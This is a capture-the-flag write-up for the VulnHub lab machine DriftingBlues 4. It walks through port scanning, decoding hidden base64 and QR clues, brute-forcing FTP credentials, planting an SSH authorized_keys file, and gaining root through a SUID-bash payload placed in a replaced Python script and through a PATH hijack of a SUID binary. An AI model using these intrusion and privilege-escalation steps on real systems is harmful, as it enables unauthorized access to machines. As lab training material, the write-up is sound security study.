# BOX NAME: DriftingBlues 4
**LINK**: https://www.vulnhub.com/entry/driftingblues-4,661/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate box and find hidden base64 code that leads to username discovery. 
2. Brute force running services and abuse SSH-keys
3. Abuse local scripts to grant root-access.

One takeaway from this is the zbar-tools. I wasn't aware that you could scan a QR-image directly from the command line.
The box itself was prerry easy. There were atleast two ways to root this box. 
The /usr/bin/getinfo SUID had all the commands set with an argument so we couldn't abuse it in the same way as the last box. But with some modifications we could eventually root the box in two ways. The SUID and the emergency.py.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.51
[+] URL:	http://driftingblues.box
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-db4.log  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 07:45 CEST
Nmap scan report for test.driftingblues.box (10.77.0.51)
Host is up (0.00031s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6afed61723cb90792bb12d3753974658 (RSA)
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
http://driftingblues.box [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.77.0.51]
```

nikto-scan

```
└─$ nikto -h $IP | tee nikto-db4.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.51
+ Target Hostname:    10.77.0.51
+ Target Port:        80
+ Start Time:         2023-04-27 07:45:43 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 199, size: 5b87d67f3b180, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-04-27 07:46:09 (GMT2) (26 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```
└─$ ffuf -u $URL/FUZZ -w /base/wordlists/web-fuzz/combined_files.txt -s -mc 200 | tee ffuf-files-db4
└─$ ffuf -u $URL/FUZZ -w /base/wordlists/web-fuzz/directory-list-2.3-big.txt -recursion -s -mc 200 | tee ffuf-dir-db4.log
#BUST

/imfuckingmad.txt --> brainfuck cipher --> /iTiS3Cr3TbiTCh.png --> QR-code image.

```
other

```
on the webpage html-source there is a base64-string.

└─$ hURL -b 'Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09'
Original string       :: Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09
base64 DEcoded string :: go back intruder!!! dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==

└─$ hURL -b 'dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ=='                                                                    
Original string       :: dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==
base64 DEcoded string :: tight security drippin aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=

└─$ hURL -b 'aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0='                                                        
Original string       :: aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=
base64 DEcoded string :: i hope you're an employee L2ltZnVja2luZ21hZC50eHQ=

└─$ hURL -b 'L2ltZnVja2luZ21hZC50eHQ='                                            
Original string       :: L2ltZnVja2luZ21hZC50eHQ=                                                                                
base64 DEcoded string :: /imfuckingmad.txt


```
```
Downliad zbar-tools and scan the image from the commandline.
└─$ zbarimg iTiS3Cr3TbiTCh.png 
QR-Code:https://i.imgur.com/a4JjS76.png  (its amazing this link is still alive.)
The image gives us a few possible usernames.

```

</details>
<details><summary><ins>OTHER</ins></summary>


FTP (Port 21)
```
ProFTPD
The FTP server won't allow anonymous login. We'll have to try and brute. (took us seriously 3 seconds to get a password..)

[21][ftp] host: 10.77.0.51   login: luther   password: mypics

ftp> ls -al
229 Entering Extended Passive Mode (|||48892|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   3 root     root         4096 Jan  9  2021 .
drwxrwxrwx   3 root     root         4096 Jan  9  2021 ..
drwxrwxrwx   2 1001     1001         4096 Jan  9  2021 hubert
-rw-r--r--   1 root     root           50 Apr 27 06:01 sync_log
226 Transfer complete

it seems to be pointing to a users home directory (1001:1001 - hubert), which is empty. But we seem to have write access.
The sync_log means nothing.
Let's try and put some ssh keys in there.

ftp> ls -al
229 Entering Extended Passive Mode (|||51311|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 luther   luther       4096 Apr 27 06:03 .
drwxrwxrwx   3 1001     1001         4096 Apr 27 06:02 ..
-rw-r--r--   1 luther   luther        571 Apr 27 06:03 authorized_keys
226 Transfer complete
ftp> 

```
SSH (Port 22)
```
OpenSSH 7.9p1 --> does not support password auth. No point in bruteforcing.

└─$ ssh -i id_rsa hubert@$IP
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hubert@driftingblues:~$ 

```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/usr/bin/getinfo
/home/user/hubert/emergency.py
```

**SUID's**:
We have another getinfo suid file. Will we be able to abuse PATH on this box to?
```
hubert@driftingblues:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/getinfo
/usr/bin/mount
/usr/bin/chfn                                                                                                       
/usr/bin/umount                                                                                                     
/usr/bin/newgrp                                                                                                     
/usr/bin/su                                                                                                         
/usr/bin/gpasswd                                                                                                    
/usr/bin/chsh 
```
**SGID's**:

```
hubert@driftingblues:~$ find / -perm -g=s -type f 2>/dev/null                                                       
/usr/bin/crontab                                                                                                    
/usr/bin/chage                                                                                                      
/usr/bin/getinfo                                                                                                    
/usr/bin/wall                                                                                                       
/usr/bin/bsd-write                                                                                                  
/usr/bin/expiry                                                                                                     
/usr/bin/ssh-agent                                                                                                  
/usr/bin/dotlockfile                                                                                                
/usr/sbin/unix_chkpwd
```
**OTHERS**:

```
```
```
hubert@driftingblues:~$ cat emergency.py 
#!/usr/bin/python

import os

os.system('echo 1 >> /tmp/backdoor_testing')

# template python script for backdoor purposes
# i'm gonna leave it with loose permissions
--snip--
--snip--
# say africa without a's
```
```
Let's abuse the emergency python script. We can't modify it but we can delete it and replace it with our own.

hubert@driftingblues:~$ cat emergency.py
#!/usr/bin/python

import os

os.system("cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash")
```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
hubert@driftingblues:~$ file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a
/bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ffe165dc81a64aea2b05beda07aeda8ad71f1e7c, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster


Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
luther:mypics
gary
hubert
clark
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
#!/usr/bin/python
import os
os.system("cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash")

/tmp/rootbash -p
rootbash-5.0# id
uid=1001(hubert) gid=1001(hubert) euid=0(root) egid=0(root) groups=0(root),1001(hubert)
```
```
EXTRA:[The SUID binary /usr/bin/getinfo]
echo '#!/bin/bash
> cp /bin/bash /tmp/rootbash2; chown root:root /tmp/rootbash2; chmod +xs /tmp/rootbash2;' > ip
chmod +x ip
/usr/bin/getinfo

hubert@driftingblues:/tmp$ ./rootbash2 -p
rootbash2-5.0# id
uid=1001(hubert) gid=1001(hubert) euid=0(root) egid=0(root) groups=0(root),1001(hubert)

```

```
hubert@driftingblues:~$ cat user.txt
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█


```

```
rootbash-5.0# cat /root/root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

```

</details>